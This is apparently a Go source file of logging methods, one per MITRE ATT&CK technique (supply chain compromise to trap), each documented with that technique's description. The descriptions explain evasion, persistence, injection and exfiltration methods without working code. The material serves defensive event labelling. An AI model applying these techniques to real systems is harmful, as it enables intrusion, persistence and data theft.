/* ATTACKEntSupplyChainCompromise Phases: initial-access

Adversaries may manipulate products or product delivery mechanisms prior to
receipt by a final consumer for the purpose of data or system compromise. Supply
chain compromise can take place at any stage of the supply chain including:
Manipulation of development tools Manipulation of a development environment
Manipulation of source code repositories (public or private) Manipulation of
source code in open-source dependencies Manipulation of software
update/distribution mechanisms Compromised/infected system images (multiple
cases of removable media infected at the factory) (Citation: IBM Storwize)
(Citation: Schneider Electric USB Malware)  Replacement of legitimate software
with modified versions Sales of modified/counterfeit products to legitimate
distributors Shipment interdiction  While supply chain compromise can impact any
component of hardware or software, attackers looking to gain execution have
often focused on malicious additions to legitimate software in software
distribution or update channels. (Citation: Avast CCleaner3 2018) (Citation:
Microsoft Dofoil 2018) (Citation: Command Five SK 2011) Targeting may be
specific to a desired victim set (Citation: Symantec Elderwood Sept 2012) or
malicious software may be distributed to a broad set of consumers but only move
on to additional tactics on specific victims. (Citation: Avast CCleaner3 2018)
(Citation: Command Five SK 2011) Popular open source projects that are used as
dependencies in many applications may also be targeted as a means to add
malicious code to users of the dependency. (Citation: Trendmicro NPM Compromise)
*/
func (g *Session) ATTACKEntSupplyChainCompromise(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1195").
        Msg("supply chain compromise")
}

/* ATTACKEntSymmetricCryptography Phases: command-and-control

Adversaries may employ a known symmetric encryption algorithm to conceal command
and control traffic rather than relying on any inherent protections provided by
a communication protocol. Symmetric encryption algorithms use the same key for
plaintext encryption and ciphertext decryption. Common symmetric encryption
algorithms include AES, DES, 3DES, Blowfish, and RC4.
*/
func (g *Session) ATTACKEntSymmetricCryptography(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1573.001").
        Msg("symmetric cryptography")
}

/* ATTACKEntSystemChecks Phases: defense-evasion discovery

Adversaries may employ various system checks to detect and avoid virtualization
and analysis environments. This may include changing behaviors based on the
results of checks for the presence of artifacts indicative of a virtual machine
environment (VME) or sandbox. If the adversary detects a VME, they may alter
their malware to disengage from the victim or conceal the core functions of the
implant. They may also search for VME artifacts before dropping secondary or
additional payloads. Adversaries may use the information learned from
Virtualization/Sandbox Evasion during automated discovery to shape follow-on
behaviors.  Specific checks will vary based on the target and/or adversary, but
may involve behaviors such as Windows Management Instrumentation, PowerShell,
System Information Discovery, and Query Registry to obtain system information
and search for VME artifacts. Adversaries may search for VME artifacts in
memory, processes, file system, hardware, and/or the Registry. Adversaries may
use scripting to automate these checks  into one script and then have the
program exit if it determines the system to be a virtual environment.  Checks
could include generic system properties such as host/domain name and samples of
network traffic. Adversaries may also check the network adapters addresses, CPU
core count, and available memory/drive size.  Other common checks may enumerate
services running that are unique to these applications, installed programs on
the system, manufacturer/product fields for strings relating to virtual machine
applications, and VME-specific hardware/processor instructions.(Citation: McAfee
Virtual Jan 2017) In applications like VMWare, adversaries can also use a
special I/O port to send commands and receive output.  Hardware checks, such as
the presence of the fan, temperature, and audio devices, could also be used to
gather evidence that can be indicative a virtual environment. Adversaries may
also query for specific readings from these devices.(Citation: Unit 42 OilRig
Sept 2018)
*/
func (g *Session) ATTACKEntSystemChecks(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1497.001").
        Msg("system checks")
}

/* ATTACKEntSystemFirmware Phases: persistence defense-evasion

Adversaries may modify system firmware to persist on systems.The BIOS (Basic
Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or
Extensible Firmware Interface (EFI) are examples of system firmware that operate
as the software interface between the operating system and hardware of a
computer. (Citation: Wikipedia BIOS) (Citation: Wikipedia UEFI) (Citation: About
UEFI) System firmware like BIOS and (U)EFI underly the functionality of a
computer and may be modified by an adversary to perform or assist in malicious
activity. Capabilities exist to overwrite the system firmware, which may give
sophisticated adversaries a means to install malicious firmware updates as a
means of persistence on a system that may be difficult to detect.
*/
func (g *Session) ATTACKEntSystemFirmware(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1542.001").
        Msg("system firmware")
}

/* ATTACKEntSystemInformationDiscovery Phases: discovery

An adversary may attempt to get detailed information about the operating system
and hardware, including version, patches, hotfixes, service packs, and
architecture. Adversaries may use the information from System Information
Discovery during automated discovery to shape follow-on behaviors, including
whether or not the adversary fully infects the target and/or attempts specific
actions. Tools such as Systeminfo can be used to gather detailed system
information. A breakdown of system data can also be gathered through the macOS
systemsetup command, but it requires administrative privileges. Infrastructure
as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to
instance and virtual machine information via APIs. Successful authenticated API
calls can return data such as the operating system platform and status of a
particular instance or the model view of a virtual machine.(Citation: Amazon
Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft
Virutal Machine API)
*/
func (g *Session) ATTACKEntSystemInformationDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1082").
        Msg("system information discovery")
}

/* ATTACKEntSystemLocationDiscovery Phases: discovery

Adversaries may gather information in an attempt to calculate the geographical
location of a victim host. Adversaries may use the information from System
Location Discovery during automated discovery to shape follow-on behaviors,
including whether or not the adversary fully infects the target and/or attempts
specific actions. Adversaries may attempt to infer the location of a system
using various system checks, such as time zone, keyboard layout, and/or language
settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation
2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as
GetLocaleInfoW can also be used to determine the locale of the host.(Citation:
FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone
may also be discovered by accessing the instance metadata service from the
instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure
Instance Metadata 2021) Adversaries may also attempt to infer the location of a
victim host using IP addressing, such as via online geolocation IP-lookup
services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos
Geolocation 2016)
*/
func (g *Session) ATTACKEntSystemLocationDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1614").
        Msg("system location discovery")
}

/* ATTACKEntSystemNetworkConfigurationDiscovery Phases: discovery

Adversaries may look for details about the network configuration and settings of
systems they access or through information discovery of remote systems. Several
operating system administration utilities exist that can be used to gather this
information. Examples include Arp, ipconfig/ifconfig, nbtstat, and route.
Adversaries may use the information from System Network Configuration Discovery
during automated discovery to shape follow-on behaviors, including whether or
not the adversary fully infects the target and/or attempts specific actions.
*/
func (g *Session) ATTACKEntSystemNetworkConfigurationDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1016").
        Msg("system network configuration discovery")
}

/* ATTACKEntSystemNetworkConnectionsDiscovery Phases: discovery

Adversaries may attempt to get a listing of network connections to or from the
compromised system they are currently accessing or from remote systems by
querying for information over the network.  An adversary who gains access to a
system that is part of a cloud-based environment may map out Virtual Private
Clouds or Virtual Networks in order to determine what systems and services are
connected. The actions performed are likely the same types of discovery
techniques depending on the operating system, but the resulting information may
include details about the networked cloud environment relevant to the
adversary's goals. Cloud providers may have different ways in which their
virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft
Azure Virtual Network Overview)(Citation: Google VPC Overview) Utilities and
commands that acquire this information include netstat, "net use," and "net
session" with Net. In Mac and Linux, netstat and lsof can be used to list
current connections. who -a and w can be used to show which users are currently
logged in, similar to "net session".
*/
func (g *Session) ATTACKEntSystemNetworkConnectionsDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1049").
        Msg("system network connections discovery")
}

/* ATTACKEntSystemOwnerUserDiscovery Phases: discovery

Adversaries may attempt to identify the primary user, currently logged in user,
set of users that commonly uses a system, or whether a user is actively using
the system. They may do this, for example, by retrieving account usernames or by
using OS Credential Dumping. The information may be collected in a number of
different ways using other Discovery techniques, because user and username
details are prevalent throughout a system and include running process ownership,
file/directory ownership, session information, and system logs. Adversaries may
use the information from System Owner/User Discovery during automated discovery
to shape follow-on behaviors, including whether or not the adversary fully
infects the target and/or attempts specific actions. Utilities and commands that
acquire this information include whoami. In Mac and Linux, the currently logged
in user can be identified with w and who.
*/
func (g *Session) ATTACKEntSystemOwnerUserDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1033").
        Msg("system owner/user discovery")
}

/* ATTACKEntSystemServiceDiscovery Phases: discovery

Adversaries may try to get information about registered services. Commands that
may obtain information about services using operating system utilities are "sc,"
"tasklist /svc" using Tasklist, and "net start" using Net, but adversaries may
also use other tools as well. Adversaries may use the information from System
Service Discovery during automated discovery to shape follow-on behaviors,
including whether or not the adversary fully infects the target and/or attempts
specific actions.
*/
func (g *Session) ATTACKEntSystemServiceDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1007").
        Msg("system service discovery")
}

/* ATTACKEntSystemServices Phases: execution

Adversaries may abuse system services or daemons to execute commands or
programs. Adversaries can execute malicious content by interacting with or
creating services. Many services are set to run at boot, which can aid in
achieving persistence (Create or Modify System Process), but adversaries can
also abuse services for one-time or temporary execution.
*/
func (g *Session) ATTACKEntSystemServices(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1569").
        Msg("system services")
}

/* ATTACKEntSystemShutdownReboot Phases: impact

Adversaries may shutdown/reboot systems to interrupt access to, or aid in the
destruction of, those systems. Operating systems may contain commands to
initiate a shutdown/reboot of a machine. In some cases, these commands may also
be used to initiate a shutdown/reboot of a remote computer.(Citation: Microsoft
Shutdown Oct 2017) Shutting down or rebooting systems may disrupt access to
computer resources for legitimate users. Adversaries may attempt to
shutdown/reboot a system after impacting it in other ways, such as Disk
Structure Wipe or Inhibit System Recovery, to hasten the intended effects on
system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic
Destroyer 2018)
*/
func (g *Session) ATTACKEntSystemShutdownReboot(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1529").
        Msg("system shutdown/reboot")
}

/* ATTACKEntSystemTimeDiscovery Phases: discovery

An adversary may gather the system time and/or time zone from a local or remote
system. The system time is set and stored by the Windows Time Service within a
domain to maintain time synchronization between systems and services in an
enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time
Service) System time information may be gathered in a number of ways, such as
with Net on Windows by performing net time \hostname to gather the system time
on a remote system. The victim's time zone may also be inferred from the current
system time or gathered by using w32tm /tz. (Citation: Technet Windows Time
Service) This information could be useful for performing other techniques, such
as executing a file with a Scheduled Task/Job (Citation: RSA EU12 They're
Inside), or to discover locality information based on time zone to assist in
victim targeting (i.e. System Location Discovery). Adversaries may also use
knowledge of system time as part of a time bomb, or delaying execution until a
specified date/time.(Citation: AnyRun TimeBomb)
*/
func (g *Session) ATTACKEntSystemTimeDiscovery(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1124").
        Msg("system time discovery")
}

/* ATTACKEntSystemdService Phases: persistence privilege-escalation

Adversaries may create or modify systemd services to repeatedly execute
malicious payloads as part of persistence. The systemd service manager is
commonly used for managing background daemon processes (also known as services)
and other system resources.(Citation: Linux man-pages: systemd January
2014)(Citation: Freedesktop.org Linux systemd 29SEP2018) Systemd is the default
initialization (init) system on many Linux distributions starting with Debian 8,
Ubuntu 15.04, CentOS 7, RHEL 7, Fedora 15, and replaces legacy init systems
including SysVinit and Upstart while remaining backwards compatible with the
aforementioned init systems. Systemd utilizes configuration files known as
service units to control how services boot and under what conditions. By
default, these unit files are stored in the /etc/systemd/system and
/usr/lib/systemd/system directories and have the file extension .service. Each
service unit file may contain numerous directives that can execute system
commands:  ExecStart, ExecStartPre, and ExecStartPost directives cover execution
of commands when a services is started manually by 'systemctl' or on system
start if the service is set to automatically start.  ExecReload directive covers
when a service restarts.  ExecStop and ExecStopPost directives cover when a
service is stopped or manually by 'systemctl'.  Adversaries have used systemd
functionality to establish persistent access to victim systems by creating
and/or modifying service unit files that cause systemd to execute malicious
commands at system boot.(Citation: Anomali Rocke March 2019) While adversaries
typically require root privileges to create/modify service unit files in the
/etc/systemd/system and /usr/lib/systemd/system directories, low privilege users
can create/modify service unit files in directories such as
~/.config/systemd/user/ to achieve user-level persistence.(Citation: Rapid7
Service Persistence 22JUNE2016)
*/
func (g *Session) ATTACKEntSystemdService(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1543.002").
        Msg("systemd service")
}

/* ATTACKEntSystemdTimers Phases: execution persistence privilege-escalation

Adversaries may abuse systemd timers to perform task scheduling for initial or
recurring execution of malicious code. Systemd timers are unit files with file
extension .timer that control services. Timers can be set to run on a calendar
event or after a time span relative to a starting point. They can be used as an
alternative to Cron in Linux environments.(Citation: archlinux Systemd Timers
Aug 2020) Each .timer file must have a corresponding .service file with the same
name, e.g., example.timer and example.service. .service files are Systemd
Service unit files that are managed by the systemd system and service
manager.(Citation: Linux man-pages: systemd January 2014) Privileged timers are
written to /etc/systemd/system/ and /usr/lib/systemd/system while user level are
written to ~/.config/systemd/user/. An adversary may use systemd timers to
execute malicious code at system startup or on a scheduled basis for
persistence.(Citation: Arch Linux Package Systemd Compromise BleepingComputer
10JUL2018)(Citation: gist Arch package compromise 10JUL2018)(Citation: acroread
package compromised Arch Linux Mail 8JUL2018) Timers installed using privileged
paths may be used to maintain root level persistence. Adversaries may also
install user level timers to achieve user level persistence.
*/
func (g *Session) ATTACKEntSystemdTimers(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1053.006").
        Msg("systemd timers")
}

/* ATTACKEntTFTPBoot Phases: defense-evasion persistence

Adversaries may abuse netbooting to load an unauthorized network device
operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot
(netbooting) is commonly used by network administrators to load configuration-
controlled network device images from a centralized management server.
Netbooting is one option in the boot sequence and can be used to centralize,
manage, and control device images. Adversaries may manipulate the configuration
on the network device specifying use of a malicious TFTP server, which may be
used in conjunction with Modify System Image to load a modified image on device
startup or reset. The unauthorized image allows adversaries to modify device
configuration, add malicious capabilities to the device, and introduce backdoors
to maintain control of the network device while minimizing detection through use
of a standard functionality. This technique is similar to ROMMONkit and may
result in the network device running a modified image. (Citation: Cisco Blog
Legacy Device Attacks)
*/
func (g *Session) ATTACKEntTFTPBoot(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1542.005").
        Msg("tftp boot")
}

/* ATTACKEntTaintSharedContent Phases: lateral-movement

Adversaries may deliver payloads to remote systems by adding content to shared
storage locations, such as network drives or internal code repositories. Content
stored on network drives or in other shared locations may be tainted by adding
malicious programs, scripts, or exploit code to otherwise valid files. Once a
user opens the shared tainted content, the malicious portion can be executed to
run the adversary's code on a remote system. Adversaries may use tainted shared
content to move laterally. A directory share pivot is a variation on this
technique that uses several other techniques to propagate malware when users
access a shared network directory. It uses Shortcut Modification of directory
.LNK files that use Masquerading to look like the real directories, which are
hidden through Hidden Files and Directories. The malicious .LNK-based
directories have an embedded command that executes the hidden malware file in
the directory and then opens the real intended directory so that the user's
expected action still occurs. When used with frequently used network
directories, the technique may result in frequent reinfections and broad access
to systems and potentially to new and higher privileged accounts. (Citation:
Retwin Directory Share Pivot) Adversaries may also compromise shared network
directories through binary infections by appending or prepending its code to the
healthy binary on the shared network directory. The malware may modify the
original entry point (OEP) of the healthy binary to ensure that it is executed
before the legitimate code. The infection could continue to spread via the newly
infected file when it is executed by a remote system. These infections may
target both binary and non-binary formats that end with extensions including,
but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.
*/
func (g *Session) ATTACKEntTaintSharedContent(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1080").
        Msg("taint shared content")
}

/* ATTACKEntTemplateInjection Phases: defense-evasion

Adversaries may create or modify references in Office document templates to
conceal malicious code or force authentication attempts. Microsoft’s Office Open
XML (OOXML) specification defines an XML-based format for Office documents
(.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML
files are packed together ZIP archives compromised of various XML files,
referred to as parts, containing properties that collectively define how a
document is rendered. (Citation: Microsoft Open XML July 2017) Properties within
parts may reference shared public resources accessed via online URLs. For
example, template properties reference a file, serving as a pre-formatted
document blueprint, that is fetched when the document is loaded. Adversaries may
abuse this technology to initially conceal malicious code to be executed via
documents. Template references injected into a document may enable malicious
payloads to be fetched and executed when the document is loaded. (Citation: SANS
Brian Wiltse Template Injection) These documents can be delivered via other
techniques such as Phishing and/or Taint Shared Content and may evade static
detections since no typical indicators (VBA macro, script, etc.) are present
until after the malicious payload is fetched. (Citation: Redxorblue Remote
Template Injection) Examples have been seen in the wild where template injection
was used to load malicious code containing an exploit. (Citation: MalwareBytes
Template Injection OCT 2017) This technique may also enable Forced
Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and
triggering an authentication attempt. (Citation: Anomali Template Injection MAR
2018) (Citation: Talos Template Injection July 2017) (Citation: ryhanson
phishery SEPT 2016)
*/
func (g *Session) ATTACKEntTemplateInjection(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1221").
        Msg("template injection")
}

/* ATTACKEntThreadExecutionHijacking Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into hijacked processes in order to evade
process-based defenses as well as possibly elevate privileges. Thread Execution
Hijacking is a method of executing arbitrary code in the address space of a
separate live process.  Thread Execution Hijacking is commonly performed by
suspending an existing process then unmapping/hollowing its memory, which can
then be replaced with malicious code or the path to a DLL. A handle to an
existing victim process is first created with native Windows API calls such as
OpenThread. At this point the process can be suspended then written to,
realigned to the injected code, and resumed via SuspendThread , VirtualAllocEx,
WriteProcessMemory, SetThreadContext, then ResumeThread respectively.(Citation:
Elastic Process Injection July 2017) This is very similar to Process Hollowing
but targets an existing process rather than creating a process in a suspended
state.   Running code in the context of another process may allow access to the
process's memory, system/network resources, and possibly elevated privileges.
Execution via Thread Execution Hijacking may also evade detection from security
products since the execution is masked under a legitimate process.
*/
func (g *Session) ATTACKEntThreadExecutionHijacking(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.003").
        Msg("thread execution hijacking")
}

/* ATTACKEntThreadLocalStorage Phases: defense-evasion privilege-escalation

Adversaries may inject malicious code into processes via thread local storage
(TLS) callbacks in order to evade process-based defenses as well as possibly
elevate privileges. TLS callback injection is a method of executing arbitrary
code in the address space of a separate live process.  TLS callback injection
involves manipulating pointers inside a portable executable (PE) to redirect a
process to malicious code before reaching the code's legitimate entry point. TLS
callbacks are normally used by the OS to setup and/or cleanup data used by
threads. Manipulating TLS callbacks may be performed by allocating and writing
to specific offsets within a process’ memory space using other Process Injection
techniques such as Process Hollowing.(Citation: FireEye TLS Nov 2017) Running
code in the context of another process may allow access to the process's memory,
system/network resources, and possibly elevated privileges. Execution via TLS
callback injection may also evade detection from security products since the
execution is masked under a legitimate process.
*/
func (g *Session) ATTACKEntThreadLocalStorage(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1055.005").
        Msg("thread local storage")
}

/* ATTACKEntThreatIntelVendors Phases: reconnaissance

Adversaries may search private data from threat intelligence vendors for
information that can be used during targeting. Threat intelligence vendors may
offer paid feeds or portals that offer more data than what is publicly reported.
Although sensitive details (such as customer names and other identifiers) may be
redacted, this information may contain trends regarding breaches such as target
industries, attribution claims, and successful TTPs/countermeasures.(Citation:
D3Secutrity CTI Feeds) Adversaries may search in private threat intelligence
vendor data to gather actionable information. Threat actors may seek
information/indicators gathered about their own campaigns, as well as those
conducted by other adversaries that may align with their target industries,
capabilities/objectives, or other operational concerns. Information reported by
vendors may also reveal opportunities other forms of reconnaissance (ex: Search
Open Websites/Domains), establishing operational resources (ex: Develop
Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-
Facing Application or External Remote Services).
*/
func (g *Session) ATTACKEntThreatIntelVendors(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1597.001").
        Msg("threat intel vendors")
}

/* ATTACKEntTimeBasedEvasion Phases: defense-evasion discovery

Adversaries may employ various time-based methods to detect and avoid
virtualization and analysis environments. This may include enumerating time-
based properties, such as uptime or the system clock, as well as the use of
timers or other triggers to avoid a virtual machine environment (VME) or
sandbox, specifically those that are automated or only operate for a limited
amount of time. Adversaries may employ various time-based evasions, such as
delaying malware functionality upon initial execution using programmatic sleep
commands or native system scheduling functionality (ex: Scheduled Task/Job).
Delays may also be based on waiting for specific victim conditions to be met
(ex: system time, events, etc.) or employ scheduled Multi-Stage Channels to
avoid analysis and scrutiny. Adversaries may also use time as a metric to detect
sandboxes and analysis environments, particularly those that attempt to
manipulate time mechanisms to simulate longer elapses of time. For example, an
adversary may be able to identify a sandbox accelerating time by sampling and
calculating the expected value for an environment's timestamp before and after
execution of a sleep function.(Citation: ISACA Malware Tricks)
*/
func (g *Session) ATTACKEntTimeBasedEvasion(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1497.003").
        Msg("time based evasion")
}

/* ATTACKEntTimeProviders Phases: persistence privilege-escalation

Adversaries may abuse time providers to execute DLLs when the system boots. The
Windows Time service (W32Time) enables time synchronization across and within
domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are
responsible for retrieving time stamps from hardware/network resources and
outputting these values to other network clients. (Citation: Microsoft
TimeProvider) Time providers are implemented as dynamic-link libraries (DLLs)
that are registered in the subkeys of
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\.
(Citation: Microsoft TimeProvider) The time provider manager, directed by the
service control manager, loads and starts time providers listed and enabled
under this key at system startup and/or whenever parameters are changed.
(Citation: Microsoft TimeProvider) Adversaries may abuse this architecture to
establish persistence, specifically by registering and enabling a malicious DLL
as a time provider. Administrator privileges are required for time provider
registration, though execution will run in context of the Local Service account.
(Citation: Github W32Time Oct 2017)
*/
func (g *Session) ATTACKEntTimeProviders(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1547.003").
        Msg("time providers")
}

/* ATTACKEntTimestomp Phases: defense-evasion

Adversaries may modify file time attributes to hide new or changes to existing
files. Timestomping is a technique that modifies the timestamps of a file (the
modify, access, create, and change times), often to mimic files that are in the
same folder. This is done, for example, on files that have been modified or
created by the adversary so that they do not appear conspicuous to forensic
investigators or file analysis tools. Timestomping may be used along with file
name Masquerading to hide malware and tools.(Citation: WindowsIR Anti-Forensic
Techniques)
*/
func (g *Session) ATTACKEntTimestomp(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1070.006").
        Msg("timestomp")
}

/* ATTACKEntTokenImpersonationTheft Phases: defense-evasion privilege-escalation

Adversaries may duplicate then impersonate another user's token to escalate
privileges and bypass access controls. An adversary can create a new access
token that duplicates an existing token using DuplicateToken(Ex). The token can
then be used with ImpersonateLoggedOnUser to allow the calling thread to
impersonate a logged on user's security context, or with SetThreadToken to
assign the impersonated token to a thread. An adversary may do this when they
have a specific, existing process they want to assign the new token to. For
example, this may be useful for when the target user has a non-network logon
session on the system.
*/
func (g *Session) ATTACKEntTokenImpersonationTheft(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1134.001").
        Msg("token impersonation/theft")
}

/* ATTACKEntTool Phases: resource-development

Adversaries may buy, steal, or download software tools that can be used during
targeting. Tools can be open or closed source, free or commercial. A tool can be
used for malicious purposes by an adversary, but (unlike malware) were not
intended to be used for those purposes (ex: PsExec). Tool acquisition can
involve the procurement of commercial software licenses, including for red
teaming tools such as Cobalt Strike. Commercial software may be obtained through
purchase, stealing licenses (or licensed copies of the software), or cracking
trial versions.(Citation: Recorded Future Beacon 2019) Adversaries may obtain
tools to support their operations, including to support execution of post-
compromise behaviors. In addition to freely downloading or purchasing software,
adversaries may steal software and/or software licenses from third-party
entities (including other adversaries).
*/
func (g *Session) ATTACKEntTool(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1588.002").
        Msg("tool")
}

/* ATTACKEntTrafficDuplication Phases: exfiltration

Adversaries may leverage traffic mirroring in order to automate data
exfiltration over compromised network infrastructure.  Traffic mirroring is a
native feature for some network devices and used for network analysis and may be
configured to duplicate traffic and forward to one or more destinations for
analysis by a network analyzer or other monitoring device. (Citation: Cisco
Traffic Mirroring) (Citation: Juniper Traffic Mirroring) Adversaries may abuse
traffic mirroring to mirror or redirect network traffic through other network
infrastructure they control. Malicious modifications to network devices to
enable traffic redirection may be possible through ROMMONkit or Patch System
Image.(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)
Adversaries may use traffic duplication in conjunction with Network Sniffing,
Input Capture, or Man-in-the-Middle depending on the goals and objectives of the
adversary.
*/
func (g *Session) ATTACKEntTrafficDuplication(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1020.001").
        Msg("traffic duplication")
}

/* ATTACKEntTrafficSignaling Phases: defense-evasion persistence command-and-control

Adversaries may use traffic signaling to hide open ports or other malicious
functionality used for persistence or command and control. Traffic signaling
involves the use of a magic value or sequence that must be sent to a system to
trigger a special response, such as opening a closed port or executing a
malicious task. This may take the form of sending a series of packets with
certain characteristics before a port will be opened that the adversary can use
for command and control. Usually this series of packets consists of attempted
connections to a predefined sequence of closed ports (i.e. Port Knocking), but
can involve unusual flags, specific strings, or other unique characteristics.
After the sequence is completed, opening a port may be accomplished by the host-
based firewall, but could also be implemented by custom software. Adversaries
may also communicate with an already open port, but the service listening on
that port will only respond to commands or trigger other malicious functionality
if passed the appropriate magic value(s). The observation of the signal packets
to trigger the communication can be conducted through different methods. One
means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to
use the libpcap libraries to sniff for the packets in question. Another method
leverages raw sockets, which enables the malware to use ports that are already
open for use by other programs. On network devices, adversaries may use crafted
packets to enable Network Device Authentication for standard services offered by
the device such as telnet.  Such signaling may also be used to open a closed
service port such as telnet, or to trigger module modification of malware
implants on the device, adding, removing, or changing malicious
capabilities.(Citation: Cisco Synful Knock Evolution) (Citation: FireEye -
Synful Knock) (Citation: Cisco Blog Legacy Device Attacks)  To enable this
traffic signaling on embedded devices, adversaries must first achieve and
leverage Patch System Image due to the monolithic nature of the architecture.
Adversaries may also use the Wake-on-LAN feature to turn on powered off systems.
Wake-on-LAN is a hardware feature that allows a powered down system to be
powered on, or woken up, by sending a magic packet to it. Once the system is
powered on, it may become a target for lateral movement.(Citation: Bleeping
Computer - Ryuk WoL) (Citation: AMD Magic Packet)
*/
func (g *Session) ATTACKEntTrafficSignaling(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1205").
        Msg("traffic signaling")
}

/* ATTACKEntTransferDatatoCloudAccount Phases: exfiltration

Adversaries may exfiltrate data by transferring the data, including backups of
cloud environments, to another cloud account they control on the same service to
avoid typical file transfers/downloads and network-based exfiltration detection.
A defender who is monitoring for large transfers to outside the cloud
environment through normal file transfers or over command and control channels
may not be watching for data transfers to another account within the same cloud
provider. Such transfers may utilize existing cloud provider APIs and the
internal address space of the cloud provider to blend into normal traffic or
avoid data transfers over external network interfaces. Incidents have been
observed where adversaries have created backups of cloud instances and
transferred them to separate accounts.(Citation: DOJ GRU Indictment Jul 2018)
*/
func (g *Session) ATTACKEntTransferDatatoCloudAccount(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1537").
        Msg("transfer data to cloud account")
}

/* ATTACKEntTransmittedDataManipulation Phases: impact

Adversaries may alter data en route to storage or other systems in order to
manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct
2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data,
adversaries may attempt to affect a business process, organizational
understanding, and decision making. Manipulation may be possible over a network
connection or between system processes where there is an opportunity deploy a
tool that will intercept and change information. The type of modification and
the impact it will have depends on the target transmission mechanism as well as
the goals and objectives of the adversary. For complex systems, an adversary
would likely need special expertise and possibly access to specialized software
related to the system that would typically be gained through a prolonged
information gathering campaign in order to have the desired impact.
*/
func (g *Session) ATTACKEntTransmittedDataManipulation(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1565.002").
        Msg("transmitted data manipulation")
}

/* ATTACKEntTransportAgent Phases: persistence

Adversaries may abuse Microsoft transport agents to establish persistent access
to systems. Microsoft Exchange transport agents can operate on email messages
passing through the transport pipeline to perform various tasks such as
filtering spam, filtering malicious attachments, journaling, or adding a
corporate signature to the end of all outgoing emails.(Citation: Microsoft
TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents
can be written by application developers and then compiled to .NET assemblies
that are subsequently registered with the Exchange server. Transport agents will
be invoked during a specified stage of email processing and carry out developer
defined tasks.  Adversaries may register a malicious transport agent to provide
a persistence mechanism in Exchange Server that can be triggered by adversary-
specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious
transport agent may be invoked for all emails passing through the Exchange
transport pipeline, the agent can be configured to only carry out specific tasks
in response to adversary defined criteria. For example, the transport agent may
only carry out an action like copying in-transit attachments and saving them for
later exfiltration if the recipient email address matches an entry on a list
provided by the adversary.
*/
func (g *Session) ATTACKEntTransportAgent(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1505.002").
        Msg("transport agent")
}

/* ATTACKEntTrap Phases: privilege-escalation persistence

Adversaries may establish persistence by executing malicious content triggered
by an interrupt signal. The trap command allows programs and shells to specify
commands that will be executed upon receiving interrupt signals. A common
situation is a script allowing for graceful termination and handling of common
keyboard interrupts like ctrl+c and ctrl+d. Adversaries can use this to register
code to be executed when the shell encounters specific interrupts as a
persistence mechanism. Trap commands are of the following format trap 'command
list' signals where "command list" will be executed when "signals" are
received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)
*/
func (g *Session) ATTACKEntTrap(values ...Value) {
    l := g.addValues(values...)
    l.Warn().
        Str("technique", "T1546.005").
        Msg("trap")
}

/* ATTACKEntTrustedDeveloperUtilitiesProxyExecution Phases: defense-evasion

